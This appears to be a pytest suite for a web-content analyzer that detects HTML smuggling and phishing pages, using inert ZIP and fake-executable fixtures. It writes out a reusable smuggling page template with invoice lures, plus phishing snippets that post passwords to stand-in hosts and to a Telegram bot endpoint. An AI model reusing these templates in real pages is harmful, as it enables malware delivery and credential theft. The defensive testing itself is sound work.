"""HTML smuggling (MITRE T1027.006) and phishing pages: automated tests.

The "payloads" are inert: a ZIP holding a text file and a 512-byte buffer that
only has the MZ/PE header magic. Pages are static strings; nothing is run."""

import base64
import io
import zipfile

import pytest

from detectors.scoring import ScoringMatrix
from detectors.web_content import MAX_PAYLOADS, WebContentAnalyzer
from tests.test_file_integrity import _pe_bytes
from tests.test_mail_analyzer import make_eml
from tests.test_scanner_integration import _indicators, scanner  # noqa: F401  (fixture)


def zip_bytes(name="readme.txt", body=b"hello " * 100) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr(name, body)
    return buf.getvalue()


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


def smuggling_page(payload: bytes, *, variant="objecturl", split=False) -> str:
    data = b64(payload)
    if split:                                  # "AAAA" + "BBBB" across lines, as kits do
        half = len(data) // 2
        literal = f'"{data[:half]}" +\n      "{data[half:]}"'
    else:
        literal = f'"{data}"'
    if variant == "objecturl":
        trigger = ("var u = URL.createObjectURL(b); var a = document.createElement('a');"
                   "a.href = u; a.download = 'Invoice.zip'; a.click();")
    else:
        trigger = "window.navigator.msSaveOrOpenBlob(b, 'Invoice.zip');"
    return f"""<html><body><p>Loading your document...</p><script>
      var s = {literal};
      var bin = atob(s); var arr = new Uint8Array(bin.length);
      for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
      var b = new Blob([arr], {{type: 'application/octet-stream'}});
      {trigger}
    </script></body></html>"""


def page(tmp_path, name, html):
    p = tmp_path / name
    p.write_text(html)
    return p


def analyze(tmp_path, name, html):
    return WebContentAnalyzer().analyze(page(tmp_path, name, html))


# ------------------------------------------------------------------ analyzer
@pytest.mark.parametrize("variant", ["objecturl", "mssave"])
@pytest.mark.parametrize("split", [False, True])
def test_blob_download_with_embedded_zip_is_smuggling(tmp_path, variant, split):
    r = analyze(tmp_path, "doc.html", smuggling_page(zip_bytes(), variant=variant, split=split))
    assert r.smuggling and r.smuggling_construct
    assert [p.format for p in r.payloads] == ["zip"]
    assert any("atob" in reason for reason in r.smuggling_reasons)


def test_embedded_executable_is_an_executable_payload(tmp_path):
    r = analyze(tmp_path, "doc.html", smuggling_page(_pe_bytes(4096)))
    assert r.smuggling and r.executable_payloads == ["payload1.exe"]


def test_data_uri_download_anchor(tmp_path):
    html = (f'<a id="x" download="scan.zip" href="data:application/zip;base64,{b64(zip_bytes())}">'
            "Download</a>")
    r = analyze(tmp_path, "notice.htm", html)
    assert r.smuggling and r.payloads[0].source == "data URI"


def test_export_button_without_payload_is_only_the_construct(tmp_path):
    html = """<script>function exportCsv(rows){
      var b = new Blob([rows.join('\\n')], {type: 'text/csv'});
      var a = document.createElement('a'); a.href = URL.createObjectURL(b);
      a.download = 'report.csv'; a.click(); }</script>"""
    r = analyze(tmp_path, "report.html", html)
    assert r.smuggling_construct and not r.smuggling and not r.payloads
    s = ScoringMatrix().score({"web": {"smuggling": False, "smuggling_construct": True}})
    assert [c.indicator for c in s.contributions] == ["web_download_construct"]
    assert s.verdict == "Low"


def test_inline_images_and_fonts_are_not_payloads(tmp_path):
    from tests.test_qr import qr_png
    pytest.importorskip("qrcode")
    html = f'<img src="data:image/png;base64,{b64(qr_png("https://example.com"))}">'
    r = analyze(tmp_path, "mail.html", html)
    assert not r.payloads and not r.smuggling


def test_payload_without_a_download_trigger_is_not_smuggling(tmp_path):
    html = f'<script>var keep = "{b64(zip_bytes())}";</script>'
    r = analyze(tmp_path, "page.html", html)
    assert r.payloads and not r.smuggling_construct and not r.smuggling


def test_number_of_payloads_is_capped(tmp_path):
    blobs = "".join(f'var p{i} = "{b64(zip_bytes(f"f{i}.txt", bytes([i]) * 400))}";\n'
                    for i in range(MAX_PAYLOADS + 3))
    r = analyze(tmp_path, "many.html", f"<script>{blobs}</script>")
    assert len(r.payloads) == MAX_PAYLOADS


@pytest.mark.parametrize("html,field", [
    ('<form action="https://collect.example.net/p"><input type="password" name="pw"></form>',
     "credential_form"),
    ('<input type="password" id="p"><script>fetch("https://x.example/l",{method:"POST"})</script>',
     "credential_form"),
    ('<script>u="https://api.telegram.org/bot123:abc/sendMessage"</script>', "credential_form"),
    ('<meta http-equiv="refresh" content="0; url=https://login.example.net/">', "redirects"),
    ("<script>window.location.href = 'https://login.example.net/'</script>", "redirects"),
])
def test_phishing_page_markers(tmp_path, html, field):
    assert getattr(analyze(tmp_path, "login.html", html), field)


def test_plain_page_has_no_findings(tmp_path):
    r = analyze(tmp_path, "newsletter.html",
                "<html><body><h1>October news</h1><a href='https://example.com'>Read</a></body></html>")
    assert not (r.smuggling or r.smuggling_construct or r.payloads or r.credential_form
                or r.redirects or r.obfuscation)


def test_truncated_read_is_reported(tmp_path, monkeypatch):
    import detectors.web_content as wc
    monkeypatch.setattr(wc, "MAX_READ", 100)
    assert analyze(tmp_path, "big.html", "<p>" + "x" * 500 + "</p>").truncated


# ------------------------------------------------------------------ scanner
def test_scanner_scores_smuggling_and_rescans_the_payload(scanner, tmp_path):
    (tmp_path / "scan").mkdir(exist_ok=True)
    p = page(tmp_path / "scan", "Invoice_7731.html",
             smuggling_page(zip_bytes("Invoice.pdf.exe", _pe_bytes(4096))))
    r = scanner.scan_file(str(p))
    ind = _indicators(r)
    assert {"html_smuggling", "web_embedded_payload"} <= ind
    assert any(i.startswith("web_payload:") for i in ind)          # the ZIP was scanned too
    assert r["verdict"] == "Critical"
    assert r["scan_results"]["web"]["payload_results"]


def test_smuggling_page_attached_to_mail(scanner, tmp_path):
    p = tmp_path / "scan" / "remittance.eml"
    p.parent.mkdir(exist_ok=True)
    make_eml(p, subject="Remittance advice",
             attachments=[("Remittance.html", smuggling_page(zip_bytes()).encode(), "text", "html")])
    r = scanner.scan_file(str(p))
    assert any("html_smuggling" in i for i in _indicators(r))
    assert r["verdict"] in ("High", "Critical")


def test_scanner_leaves_a_plain_page_clean(scanner, tmp_path):
    (tmp_path / "scan").mkdir(exist_ok=True)
    p = page(tmp_path / "scan", "menu.html", "<html><body><p>Lunch menu</p></body></html>")
    r = scanner.scan_file(str(p))
    assert r["verdict"] in ("Clean", "Low")
